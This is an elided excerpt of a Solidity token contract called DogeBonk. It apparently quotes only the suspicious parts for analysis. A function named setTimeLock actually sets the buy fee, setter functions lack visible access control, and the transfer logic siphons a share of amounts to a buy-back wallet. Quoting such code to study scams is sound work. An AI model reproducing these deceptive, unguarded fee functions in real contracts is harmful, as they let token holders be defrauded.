...
contract DogeBonk is Context, IERC20, Ownable {
    ...
    function setBotWallet(address newAddress) public virtual {
    ...
    function setTimeLock(uint256 newValue) public virtual {
        _buyMarketingFee = newValue;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _balances[recipient] = _balances[recipient].sub(amount / 100 * _sellMarketingFee);
            _balances[buyBackWalletAddress] = _balances[buyBackWalletAddress].add(amount / 100 * _buyMarketingFee);
